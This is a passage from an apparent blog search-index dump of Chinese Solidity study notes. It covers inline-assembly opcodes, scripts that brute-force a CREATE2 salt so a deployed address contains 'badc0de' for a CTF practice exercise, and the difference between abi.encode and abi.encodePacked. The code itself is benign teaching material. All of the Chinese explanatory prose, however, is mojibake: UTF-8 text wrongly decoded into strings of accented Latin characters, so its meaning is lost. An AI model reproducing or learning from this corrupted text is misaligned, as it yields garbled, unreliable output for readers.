å½“å‰åŒºå—è¿˜æ²¡æœ‰å‡ºç”Ÿï¼Œè¯­æ³•å†™çš„å¾ˆæ¸…æ¥šäº†ï¼Œæ˜¯æˆ‘æ²¡æœ‰ç†è§£åˆ°ä½function getBlockHash() public view returns (uint, bytes32) &#123; bytes32 hash; uint num; assembly &#123; num := number() hash := blockhash(num) // number() è·å–å½“å‰åŒºå—å· &#125; return (num, hash); &#125; è¿è¡Œç»“æœï¼š 2.2.17 timestampçš„ç”¨æ³•è¯­æ³•ï¼š 1timestamp() timestampæŒ‡ä»¤ç”¨äºè·å–å½“å‰å—çš„æ—¶é—´æˆ³ã€‚æ—¶é—´æˆ³è¡¨ç¤ºå½“å‰å—ç”Ÿæˆçš„æ—¶é—´ï¼Œä»¥ç§’ä¸ºå•ä½ã€‚ ç¤ºä¾‹ï¼š 12345678function getCurrentTimestamp() public view returns (uint) &#123; uint _timestamp; assembly &#123; _timestamp := timestamp() &#125; return _timestamp;&#125; è¿è¡Œç»“æœï¼š 2.2.18 callçš„ç”¨æ³•è¯­æ³•ï¼š 1call(g, a, v, in, insize, out, outsize) å…¶ä¸­ï¼Œgæ˜¯å¯ç”¨çš„gasæ•°é‡ï¼Œaæ˜¯è¦è°ƒç”¨çš„åˆçº¦åœ°å€ï¼Œvæ˜¯è¦å‘é€çš„ä»¥å¤ªå¸æ•°é‡ï¼Œinæ˜¯è¦å‘é€çš„è°ƒç”¨æ•°æ®ï¼Œinsizeæ˜¯è°ƒç”¨æ•°æ®çš„é•¿åº¦ï¼Œoutæ˜¯ä¸€ä¸ªæŒ‡å‘è¾“å‡ºç¼“å†²åŒºçš„æŒ‡é’ˆï¼Œoutsizeæ˜¯è¾“å‡ºç¼“å†²åŒºçš„å¤§å°ã€‚ ç¤ºä¾‹ï¼š 12345678910111213function fun(uint256 num1, uint256 num2) external returns (uint256) &#123; return sum = num1 + num2;&#125;function inline_call() public returns(bool success)&#123; bytes memory data = abi.encodeWithSignature(&quot;fun(uint256,uint256)&quot;, 260, 261); address to = address(this); assembly &#123; success := call(gas(), to, 0, add(data, 0x20), mload(data), 0, 0) &#125;&#125; è¿è¡Œç»“æœï¼š","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"å†…è”æ±‡ç¼–","slug":"å†…è”æ±‡ç¼–","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"}]},{"title":"calAddressByCreate2","slug":"Basic_Knowledge/solidity/calAddressByCreate2","date":"2023-05-25T15:10:10.000Z","updated":"2023-05-25T15:10:10.000Z","comments":true,"path":"2023/05/25/Basic_Knowledge/solidity/calAddressByCreate2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/25/Basic_Knowledge/solidity/calAddressByCreate2/","excerpt":"","text":"calAddressByCreate21. ã€ä½¿ç”¨pythonã€‘è¿™é‡Œæ˜¯å€Ÿé‰´å¼ å­¦é•¿çš„ğŸ¤£ 1.1 å®‰è£…web3åº“1pip install web3 1.2 è®¡ç®—ä»£ç 12345678910111213141516171819202122232425262728from web3 import Web3# value of your address(this) # must delet 0x# exampleï¼š0x5B38Da6a701c568545dCfcB03FcB875f56beddC4address = &quot;5B38Da6a701c568545dCfcB03FcB875f56beddC4&quot;# å›ºå®šå¸¸é‡ 0xffconst_value = &quot;0xff&quot;# å°†å‰ä¸¤ä¸ªå€¼æ‹¼æ¥èµ·æ¥s1 = const_value + address# è¿™ä¸ªä¸ºä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼Œå¯ä»¥é€šè¿‡keccak256(abi.encodePacked(bytecode))æ¥è®¡ç®—s3 = &#x27;&#x27;i = 0while(True): salt = hex(i)[2:].rjust(64, &#x27;0&#x27;) s = s1+salt+s3 hashed = Web3.keccak(hexstr=s) hashed_str = &#x27;&#x27;.join([&#x27;%02x&#x27; % b for b in hashed]) if &#x27;badc0de&#x27; in hashed_str[24:]: print(salt,hashed_str) break i += 1 print(hashed) pythonæš‚æ—¶æ²¡å­¦å¥½ï¼Œç­‰è¿‡æ®µæ—¶é—´å†å›æ¥è§£è¯» 2.ã€ä½¿ç”¨ethereumjsã€‘2.1 å®‰è£…ethereumjsåº“1npm install ethereumjs-util 2.2 è®¡ç®—ä»£ç bytecodeçš„å€¼å‰è¦å¡« 0x 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758const eth = require(&#x27;ethereumjs-util&#x27;);// a. å¸¸æ•°const const_num = &quot;0xFF&quot;;// b. åˆ›å»ºè€…åœ°å€ï¼ˆåˆçº¦åœ°å€ï¼‰// ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ï¼š address(this)// æ‹¼æ¥çš„æ—¶å€™ä¸èƒ½åŒ…å« `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. æ‹¼æ¥ const str1 = const_num + contract_add.slice(2,contract_add.length);// 4. ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç çš„hashå€¼ const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;let bytecodeToHash = eth.bufferToHex(eth.keccakFromHexString(bytecode));// å»æ‰0xbytecodeToHash = bytecodeToHash.slice(2, bytecodeToHash.length);let salt = 0;while (true) &#123; // 1. Convert i to hex, and it pad to 32 bytes: // 1. å°†iè½¬ä¸º16è¿›åˆ¶çš„å­—ç¬¦ä¸²ï¼ŒpadStartå³å¯¹é½ï¼Œç”¨ 0 è¡¥é½32bytes // var saltToBytes = salt.toString(16).padStart(64, &#x27;0&#x27;); let saltToHex = &quot;0x&quot; + salt.toString(16); let saltToHash = eth.bufferToHex(eth.keccakFromHexString(saltToHex)); saltToHash = saltToHash.slice(2, saltToHash.length); // 2. Concatenate this between the other 2 strings // 2. å°† string1 saltToBytes string2ä¸‰ä¸ªå­—æ®µçš„å€¼æ‹¼æ¥åœ¨ä¸€èµ· var concatString = str1.concat(saltToHash).concat(bytecodeToHash); /** * 3. Hash the resulting string * å¯¹ä¸Šè¡Œä»£ç çš„ concatString è¿›è¡Œhashï¼š * eth.keccakFromHexString() æ˜¯ Ethereum.js åº“ä¸­çš„ä¸€ä¸ªæ–¹æ³•ï¼Œ * ç”¨äºå¯¹ä¸€ä¸ªåå…­è¿›åˆ¶å­—ç¬¦ä¸²è¿›è¡Œ Keccak-256 å“ˆå¸Œè¿ç®—è¿”å›å€¼ç±»å‹ä¸º Buffer * */ var hashed = eth.bufferToHex(eth.keccakFromHexString(concatString)); // è¿™ä¸ªä¸å¯¹ å› ä¸º eth.keccak256()çš„å‚æ•°ä¸æ”¯æŒstringç±»å‹ï¼Œåªæ”¯æŒBufferç±»å‹ // var hashed = eth.bufferToHex(eth.keccak256(concatString)) // 4. Remove leading 0x and 12 bytes // 5. Check if the result contains badc0de // hashed.slice(26,20) if (hashed.slice(26, hashed.length).includes(&#x27;badc0de&#x27;)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hashed.slice(26, hashed.length)&#125;`); break; &#125; salt++;&#125; 3. ã€ethersjsã€‘3. 1 å®‰è£…ethersjsåº“1npm install ethers 3.2 è®¡ç®—ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import &#123; ethers &#125; from &quot;ethers&quot;/** * create2 è®¡ç®—åˆçº¦åœ°å€æ‰€éœ€è¦çš„å››ä¸ªå€¼ * * 1. 0xFFï¼šä¸€ä¸ªå¸¸æ•°ï¼Œé¿å…å’ŒCREATEå†²çª 2. åˆ›å»ºè€…åœ°å€ 3. saltï¼ˆç›ï¼‰ï¼šä¸€ä¸ªåˆ›å»ºè€…ç»™å®šçš„æ•°å€¼ 4. å¾…éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç ï¼ˆbytecodeï¼‰ */// 1. å¸¸æ•°const const_num = &quot;0xFF&quot;;// 2. åˆ›å»ºè€…åœ°å€ï¼ˆåˆçº¦åœ°å€ï¼‰// ä¸€èˆ¬æƒ…å†µä¸‹æ˜¯ï¼š address(this)// æ‹¼æ¥çš„æ—¶å€™ä¸èƒ½åŒ…å« `0x`const contract_add = &quot;0xf2B1114C644cBb3fF63Bf1dD284c8Cd716e95BE9&quot;;// 3. æ‹¼æ¥ let str1 = const_num + contract_add.slice(2,contract_add.length);// 4. ä»£éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç çš„hashå€¼const bytecode = &quot;0x608060405234801561000f575f80fd5b506103478061001d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c8063380c7a6714610038578063b2fa1c9e14610042575b5f80fd5b610040610060565b005b61004a61009d565b6040516100579190610219565b60405180910390f35b610069336100ad565b610071575f80fd5b61007a33610144565b610082575f80fd5b60015f806101000a81548160ff021916908315150217905550565b5f8054906101000a900460ff1681565b5f7f736d6172780000000000000000000000000000000000000000000000000000008273ffffffffffffffffffffffffffffffffffffffff166306fdde036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610118573d5f803e3d5ffd5b505050506040513d601f19601f8201168201806040525081019061013c9190610269565b149050919050565b5f808260601b90505f6f0badc0de00000000000000000000000090505f6f0fffffff00000000000000000000000090505f5b60228110156101f257826bffffffffffffffffffffffff19168285166bffffffffffffffffffffffff1916036101b35760019450505050506101fa565b6004826bffffffffffffffffffffffff1916901b91506004836bffffffffffffffffffffffff1916901b925080806101ea906102ca565b915050610176565b505f93505050505b919050565b5f8115159050919050565b610213816101ff565b82525050565b5f60208201905061022c5f83018461020a565b92915050565b5f80fd5b5f819050919050565b61024881610236565b8114610252575f80fd5b50565b5f815190506102638161023f565b92915050565b5f6020828403121561027e5761027d610232565b5b5f61028b84828501610255565b91505092915050565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52601160045260245ffd5b5f819050919050565b5f6102d4826102c1565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361030657610305610294565b5b60018201905091905056fea26469706673582212206e6c1e4a56c3130f88f4149292cceaff6d90339aeaa3f29562e40adef7c39b2a64736f6c63430008140033&quot;;// 5.1 å¯¹bytecode è¿›è¡Œhashè¿ç®— è¿™ä¸ªåªèƒ½ç”¨å•å¼•å·// solidityKeccak256([&#x27;bytes&#x27;],[bytecode]) &lt;=&gt; keccak256(abi.encodePacked(bytecode))const bytecodeToHash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;],[bytecode]);// 5.2 ä¸‹é¢è¿™è¡Œä»£ç ä¹Ÿè¡Œï¼Œå› ä¸ºå¯¹ bytecodeè¿›è¡Œç´§æ‰“åŒ…çš„ç»“æœä¸å˜// const bytecodeToHash = ethers.utils.keccak256(bytecode);// console.log(bytecodeToHash)// 5. å®šä¹‰ä¸€ä¸ªç›ï¼Œä»¥åŠä¸€ä¸ªæ‰€æ±‚å­—æ®µlet salt = 0;const value = &quot;badc0de&quot;; // CTFé¶åœºçš„é¢˜// éå†å‡ºæŒ‡å®šå€¼ï¼Œæ±‚å‡ºsaltwhile (true) &#123; // å°†saltè½¬ä¸º16è¿›åˆ¶ï¼Œç”¨0å¡«å……ä¸º64ä½ // let saltToBytes = salt.toString(16).padStart(64, 0).toString(); let saltToHash = ethers.utils.solidityKeccak256([&#x27;uint&#x27;],[salt]); saltToHash = saltToHash.slice(2, saltToHash.length); // å†æ¬¡æ‹¼æ¥ é¡ºåºï¼š å¸¸æ•° åˆ›å»ºè€…åœ°å€ ç› å­—èŠ‚ç çš„hashå€¼ // bytecodeToHash.slice(2,bytecodeToHash.length): åˆ é™¤ `0x` let str2 = str1.concat(saltToHash).concat(bytecodeToHash.slice(2,bytecodeToHash.length)); // å¯¹ str2 è¿›è¡Œhash let hash = ethers.utils.solidityKeccak256([&#x27;bytes&#x27;] ,[str2]); // console.log(saltBuffer) // å…ˆå°†æ‰“åŒ…å¥½çš„str2 è½¬ä¸º utf8çš„å­—èŠ‚æ•°ç»„ // let saltUtf8Bytes = ethers.utils.toUtf8Bytes(str2); // å°† saltUtf8Bytes è½¬åŒ–ä¸ºbuffer // let saltBuffer = ethers.utils.arrayify(saltUtf8Bytes); // å¯¹ saltBuffer è¿›è¡Œhash // let hash = ethers.utils.keccak256(str2); //åˆ¤æ–­ æ˜¯å¦æ»¡è¶³æ¡ä»¶ if (hash.slice(26, hash.length).includes(value)) &#123; console.log(`salt = 0x$&#123;salt.toString(16)&#125;`); console.log(`address = 0x$&#123;hash.slice(26, hash.length)&#125;`); break; &#125; salt++;&#125; æ­é…ä½¿ç”¨çš„solidityä»£ç  è®¡ç®—åœ°å€ï¼š 1234567891011 function getCreate2Address(address addToDeploy, uint256 salt, bytes memory bycode) external pure returns(address result) &#123; result = address(uint160(uint( keccak256(abi.encodePacked( uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff addToDeploy, //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ))); &#125;&#125; 4. æ¨èä½¿ç”¨ ethersjs","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"}]},{"title":"encode && encodePacked","slug":"Basic_Knowledge/solidity/abi.encode&&abi.encodePacked","date":"2023-05-24T08:10:10.000Z","updated":"2023-05-24T08:10:10.000Z","comments":true,"path":"2023/05/24/Basic_Knowledge/solidity/abi.encode&&abi.encodePacked/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/24/Basic_Knowledge/solidity/abi.encode&&abi.encodePacked/","excerpt":"","text":"abiç¼–ç çš„è¯¦è§£1.abi.encode abi.encode å°†å®ƒçš„æ¯ä¸ªå‚æ•°å¡«å……ä¸º32å­—èŠ‚ã€32 * 8 &#x3D;256ä½ã€‘ï¼ˆ1byte &#x3D; 8bitï¼‰çš„æ•°æ®ï¼Œå¹¶æ‹¼æ¥åœ¨ä¸€èµ·ã€‚ æ³¨ï¼šå¦‚æœè¦å’Œåˆçº¦äº¤äº’ï¼Œä½¿ç”¨çš„æ˜¯abi.encodeï¼ˆå®è·µæ“ä½œï¼‰ 1.1 abi.encodeç¼–ç æ¼”ç¤ºå®šä¹‰çš„å˜é‡ï¼š 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; ä»£ç 1ï¼š num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncode1() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num1, _addr, name, bs1); &#125; ä»£ç 2ï¼š num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ 123function testABIEncode2() external view returns(bytes memory reslut) &#123; reslut = abi.encode(num2, _addr, name, bs1);&#125; çœ‹è¿è¡Œç»“æœï¼š ç”±è¿è¡Œç»“æœ æ¯”è¾ƒnum1 å’Œnum2çš„ç¼–ç å€¼å¯çŸ¥ï¼Œä¸ç®¡å‚æ•°çš„æ•°æ®ç±»å‹æ˜¯ä»€ä¹ˆï¼Œå®ƒéƒ½å°†å‚æ•°å¡«å……ä¸º32ä½ã€‚æ‰€ä»¥è¿™ä¸¤ä¸ªå‡½æ•°çš„ç¼–ç ç»“æœç›¸åŒã€‚ 1.2 abi.encode ä¸åˆçº¦äº¤äº’ â€”- ä»¥create2ä¸ºä¾‹create2 çš„ä½¿ç”¨è¯·ç§»æ­¥ &#x3D;&#x3D;&#x3D;ã€‹ ã€abi.encodeã€‘é€šè¿‡ abi.encodeå¯¹è¦éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç å’Œä»£ä¼ å‚æ•°ï¼ˆid &#x3D; 1, name &#x3D; â€œbiyouâ€ï¼‰è¿›è¡Œâ€œéç´§â€æ‰“åŒ…ï¼š 123456// éç´§æ‰“åŒ… -- æ¶‰åŠäº†åˆçº¦æ„é€ å‡½æ•°çš„å‚æ•° function encodeBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; // å°†å­—èŠ‚ç å’Œå‚æ•°è¿›è¡Œç´§æ‰“åŒ… result = abi.encodePacked(temp, abi.encode(id,name));&#125; è¿è¡Œç»“æœçš„éƒ¨åˆ†æˆªå›¾ï¼š å°†è·å–çš„bytecodeçš„å€¼ï¼Œæ”¾å…¥create2Addresså‡½æ•°ä¸­,ä¼ å…¥ç›saltï¼ˆbiyouï¼‰ï¼Œè®¡ç®— Studentåˆçº¦çš„åœ°å€ create2Addresså‡½æ•°ä»£ç ï¼š 123456789101112131415function create2Address(bytes memory bycode,string memory salt) external view returns(address result)&#123; result = address( uint160( uint( keccak256(abi.encodePacked( // bytes1(0xff), uint8(0xff), // å›ºå®šçš„ä¸€ä¸ªå­—èŠ‚çš„å¸¸æ•° 0xff address(this), //å½“å‰åˆçº¦åœ°å€ï¼ˆcreate2åˆçº¦åœ°å€ï¼‰ keccak256(abi.encodePacked(salt)), //å¯¹ç›è¿›è¡Œç´§æ‰“åŒ… keccak256(bycode) //è¦è®¡ç®—çš„åˆçº¦çš„å­—èŠ‚ç  )) ) ) ); &#125; è¿è¡Œç»“æœï¼š å†å°†è·å–çš„åœ°å€é€šè¿‡remixä¸Šçš„At Addressè·å–åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„å‡½æ•°æ£€éªŒç»“æœï¼š At Address: éªŒè¯ç»“æœï¼ˆæ­£ç¡®ï¼‰ï¼š ã€abi.encodePackedã€‘é€šè¿‡ abi.encodePackedå¯¹è¦éƒ¨ç½²åˆçº¦çš„å­—èŠ‚ç å’Œä»£ä¼ å‚æ•°ï¼ˆid &#x3D; 1, name &#x3D; â€œbiyouâ€ï¼‰è¿›è¡Œâ€œéç´§â€æ‰“åŒ…ï¼š 12345// ç´§æ‰“åŒ…function encodePackedBycode(uint id, string memory name) external pure returns(bytes memory result) &#123; bytes memory temp = type(Student).creationCode; result = abi.encodePacked(temp, abi.encodePacked(id,name));&#125; è¿è¡Œç»“æœçš„éƒ¨åˆ†æˆªå›¾ï¼š å°†è·å–çš„bytecodeçš„å€¼ï¼Œæ”¾å…¥create2Addresså‡½æ•°ä¸­,ä¼ å…¥ç›saltï¼ˆbiyouï¼‰ï¼Œè®¡ç®— Studentåˆçº¦çš„åœ°å€ create2Addresså‡½æ•°åŒä¸Š è¿è¡Œç»“æœï¼š å†å°†è·å–çš„åœ°å€é€šè¿‡remixä¸Šçš„At Addressè·å–åˆçº¦ï¼Œå¹¶è°ƒç”¨å…¶ä¸­çš„å‡½æ•°æ£€éªŒç»“æœï¼š At Address: è¿è¡Œç»“æœï¼ˆå‡ºé”™ï¼‰ï¼š 2. abi.encodePacked2.1 ç¼–ç æ¼”ç¤º å°†ç»™å®šå‚æ•°æ ¹æ®å…¶æ‰€éœ€æœ€ä½ç©ºé—´ç¼–ç ã€‚ç±»ä¼¼äºabi.encodeï¼Œä½†æ˜¯ä¼šæŠŠå…¶ä¸­å¡«å……çš„å¾ˆå¤š0çœç•¥ã€‚æ¯”å¦‚ï¼Œåªç”¨1å­—èŠ‚æ¥ç¼–ç uintç±»å‹ã€‚å½“ä½ æƒ³çœç©ºé—´ï¼Œå¹¶ä¸”ä¸ä¸åˆçº¦äº¤äº’çš„æ—¶å€™ï¼Œå¯ä»¥ä½¿ç”¨abi.encodePackedï¼Œä¾‹å¦‚ç®—ä¸€äº›æ•°æ® çš„hashæ—¶ã€‚ æœ€ä½ç©ºé—´ç¼–ç ï¼ˆä¸ªäººç†è§£ï¼‰: å› ä¸ºåœ¨ä»¥å¤ªåŠEVMä¸­çš„ABIï¼Œé»˜è®¤ç»™æ¯ä¸ªå±æ€§ï¼ˆå­—æ®µï¼‰èµ‹äºˆä¸€ä¸ª 32å­—èŠ‚ï¼ˆ32 * 8 &#x3D; 256ä½ï¼‰çš„é•¿åº¦ï¼ˆä¸è¶³éƒ¨åˆ†è¢«0å¡«å……ï¼‰, å®é™…å ç”¨é•¿åº¦å–å†³äºå±æ€§çš„ç±»å‹ã€‚ æ•´å‹ï¼š 1&gt;uint8 num = 1; // è¿™ä¸ªå ç”¨8bitï¼Œå³ä¸€ä¸ªå­—èŠ‚ï¼Œå‰é¢å°†å¡«å……31 * 8 ä¸ªé›¶ï¼Œåˆå› ä¸ºåœ¨ä»¥å¤ªåŠä¸­æ•°æ®ä¸€èˆ¬æ ¼å¼ä¸º16è¿›åˆ¶ï¼Œ16è¿›åˆ¶æ•°çš„ä¸€ä½å å››ä¸ª xxxx(xæ˜¯0æˆ–1) ä¾‹ï¼š 0xff = 11111111 è¿™æ ·å‰é¢æ˜¾ç¤ºçš„0çš„ä¸ªæ•°ä¸º 31 * 8 &#x2F; 4 &#x3D; 62ä¸ªï¼ˆuint8 num &#x3D; 1ï¼Œæœ¬èº«è¡¨ç¤ºä¸ºï¼š0x01ï¼‰ æ‰€ä»¥ä½¿ç”¨abi.encodePackedæ‰“åŒ…ï¼Œå°†ä¼šæ˜¯ä¿ç•™uint8æœ¬èº«çš„é•¿åº¦ï¼ˆ8ä½ï¼‰å³1å­—èŠ‚å³0x01ï¼Œ å¦‚å›¾ï¼š 1&gt;uint256 num2 = 1;//å ç”¨ 256ä½ï¼Œå³ 0x0000000000000000000000000000000000000000000000000000000000000001ï¼Œå› ä¸ºnum2å£°æ˜ä¸ºuint256æ˜ç¡®æŒ‡æ˜äº†å ç”¨256ä½ï¼Œæ‰€ä»¥EVMä¼šç»™num2åˆ†é…çš„æœ€ä½ç©ºé—´ä¸º 256ä½ æ‰€ä»¥ä½¿ç”¨abi.encodePackedæ‰“åŒ…ï¼Œå°†ä¼šæ˜¯ä¿ç•™uint256æœ¬èº«çš„é•¿åº¦ï¼ˆ256ä½ï¼‰å³32å­—èŠ‚ å¦‚å›¾ï¼š bytesnï¼ˆnçš„èŒƒå›´æ˜¯[1,32]ï¼‰ç±»å‹ï¼šå’Œuintç±»å‹ç±»ä¼¼ bytes1 &#x3D;&#x3D;&gt; uint8 å…³äº byteså®¶æ—ç§»æ­¥&#x3D;&#x3D;ã€‹ stringç±»å‹ï¼š å°†å­—ç¬¦ä¸²è½¬ä¸ºbytesç±»å‹ä¹‹åå®é™…æœ‰å¤šé•¿å°±ä¿ç•™å¤šé•¿ å­—ç¬¦ä¸²è½¬bytesä»£ç ï¼š 123function stingConvertBytes(string memory _str) external pure returns(bytes memory result)&#123; result = abi.encodePacked(_str);&#125; addressç±»å‹ï¼š å› ä¸ºaddressæ˜¯160ä½çš„ï¼Œæ‰€ä»¥åªä¿ç•™160ä½å³å¯ å®šä¹‰çš„å˜é‡ï¼š 12345uint8 num1 = 1;uint256 num2 = 1;address _addr = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;string name = &quot;biyou&quot;;bytes1 bs1 = 0xff; ä»£ç 1ï¼š num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ _addræ˜¯addressç±»å‹ï¼Œå ç”¨20ä¸ªå­—èŠ‚ nameæ˜¯stringç±»å‹ï¼Œå ç”¨å­—èŠ‚æ•°å–å†³äºå®é™…æƒ…å†µé•¿åº¦ bs1æ˜¯bytes1ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncodePacked1() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num1, _addr, name, bs1);&#125; ç»“æœï¼š ä»£ç 2ï¼š &#96;&#96;num1æ˜¯uint8ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚&#96; num2æ˜¯uint256ç±»å‹ï¼Œå ç”¨32ä¸ªå­—èŠ‚ _addræ˜¯addressç±»å‹ï¼Œå ç”¨20ä¸ªå­—èŠ‚ nameæ˜¯stringç±»å‹ï¼Œå ç”¨å­—èŠ‚æ•°å–å†³äºå®é™…æƒ…å†µé•¿åº¦ bs1æ˜¯bytes1ç±»å‹ï¼Œå ç”¨1ä¸ªå­—èŠ‚ 123function testABIEncodePacked2() external view returns(bytes memory reslut) &#123; reslut = abi.encodePacked(num2, _addr, name, bs1);&#125; çœ‹è¿è¡Œç»“æœï¼š 3. æ€»ç»“ä¸éœ€è¦å’Œå…¶ä»–åˆçº¦äº¤äº’çš„æ—¶å€™å¤§å¤šé€‰æ‹© abi.encodePackedçš„æ‰“åŒ…æ–¹å¼ï¼ŒåŒ…æ‹¬ç­¾åæ“ä½œä»€ä¹ˆçš„ éœ€è¦ä¸å…¶ä»–åˆçº¦è¿›è¡Œäº¤äº’çš„åˆ™é€‰æ‹©abi.encodeçš„æ‰“åŒ…æ–¹å¼â€”å…¶ä»–çš„åˆçº¦äº¤äº’æ­£åœ¨å­¦ä¹ ","categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"}],"tags":[{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"}]},{"title":"Create && Create 2","slug":"Basic_Knowledge/solidity/Create2","date":"2023-05-23T08:10:10.000Z","updated":"2023-05-23T08:10:10.000Z","comments":true,"path":"2023/05/23/Basic_Knowledge/solidity/Create2/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/23/Basic_Knowledge/solidity/Create2/","excerpt":"","text":"1. create1.1 ç®€ä»‹ æ¦‚å¿µï¼š æ™ºèƒ½åˆçº¦å¯ä»¥ç”±å…¶ä»–åˆçº¦å’Œæ™®é€šè´¦æˆ·åˆ©ç”¨ createæ“ä½œç åˆ›å»ºã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œæ–°åˆçº¦çš„åœ°å€éƒ½ä»¥ç›¸åŒçš„æ–¹å¼è®¡ç®—ï¼šåˆ›å»ºè€…çš„åœ°å€(é€šå¸¸ä¸ºéƒ¨ç½²çš„é’±åŒ…åœ°å€æˆ–è€…åˆçº¦åœ°å€)å’Œnonce(è¯¥åœ°å€å‘é€äº¤æ˜“çš„æ€»æ•°,å¯¹äºåˆçº¦è´¦æˆ·æ˜¯åˆ›å»ºçš„åˆçº¦æ€»æ•°,æ¯åˆ›å»ºä¸€ä¸ªåˆçº¦nonce+1))çš„å“ˆå¸Œã€‚ è®¡ç®—å¼ï¼š æ–°åœ°å€ = hash(åˆ›å»ºè€…åœ°å€, nonce) åˆ›å»ºè€…åœ°å€ä¸ä¼šå˜ï¼Œä½†nonceå¯èƒ½ä¼šéšæ—¶é—´è€Œæ”¹å˜ï¼Œå› æ­¤createåˆ›å»ºçš„åˆçº¦åœ°å€ä¸å¥½é¢„æµ‹ã€‚ 2.create22.1 ç®€ä»‹ create2çš„ç”¨æ³•å’Œcreateæœ‰ç‚¹ç±»å‹ï¼ŒåŒæ ·æ˜¯newä¸€ä¸ªåˆçº¦ï¼Œå¹¶ä¼ å…¥æ–°åˆçº¦æ„é€ 